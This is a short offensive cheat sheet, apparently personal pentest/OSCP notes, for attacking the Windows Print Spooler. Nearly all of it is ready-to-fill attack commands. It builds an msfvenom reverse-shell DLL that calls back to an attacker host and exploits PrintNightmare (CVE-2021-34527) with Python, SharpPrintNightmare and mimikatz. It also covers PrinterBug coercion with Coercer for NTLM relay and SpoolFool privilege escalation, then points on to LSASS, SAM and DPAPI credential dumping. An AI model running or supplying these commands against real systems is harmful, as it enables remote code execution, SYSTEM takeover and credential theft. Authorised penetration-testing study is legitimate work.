# Print Spooler

## Before I start
- [ ] Spooler check on every Windows target: nxc smb <Targets> -M spooler
impacket-rpcdump <TargetIP> | grep -iE 'MS-RPRN|MS-PAR'

## PrintNightmare (unpatched / weakened Point-and-Print)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<AttackerIP> LPORT=443 -f dll -o /tmp/smb/driver.dll
impacket-smbserver share /tmp/smb -smb2support
python3 CVE-2021-34527.py '<Domain>/<User>:<Password>@<TargetIP>' '\\<AttackerIP>\share\driver.dll'
- [ ] Windows side: SharpPrintNightmare.exe '\\<AttackerIP>\share\driver.dll' '\\<TargetIP>'
- [ ] mimikatz: misc::printnightmare /server:<Target> /library:\\<AttackerIP>\share\driver.dll /authuser:<Domain>\<User> /authpassword:<Pass>
- [ ] Result: SYSTEM. Failed loads crash the spooler — one shot, make it count

## Spooler coercion (works patched)
- [ ] Not on the OSCP exam: coercion is kept out as a safe reading; OffSec's pages do not name it
coercer scan -t <Target> -u '<User>' -p '<Password>' -d <Domain>
coercer coerce -l <AttackerIP> -t <Target> -u '<User>' -p '<Password>' -d <Domain>
- [ ] Spooler up = PrinterBug fires = machine account auth to relay: :Pb coercion, :Pb ntlm-relay

## Local privesc (SpoolFool, CVE-2022-21999)
- [ ] Unpatched 2022 builds: SpoolFool.exe <dll> → local SYSTEM via spool directory
- [ ] searchsploit print spooler against the exact build first: :Pb windows-kernel

## If it fails
- [ ] July-2021+ patches require admin for driver installs → RCE dead, keep the coercion
- [ ] Point-and-Print GPO locked down → same story
- [ ] Spooler disabled on DCs (2022+ images) → try workstations

## Next
- [ ] SYSTEM → LSASS/SAM + DPAPI triage: :Pb windows-creds, :Pb dpapi
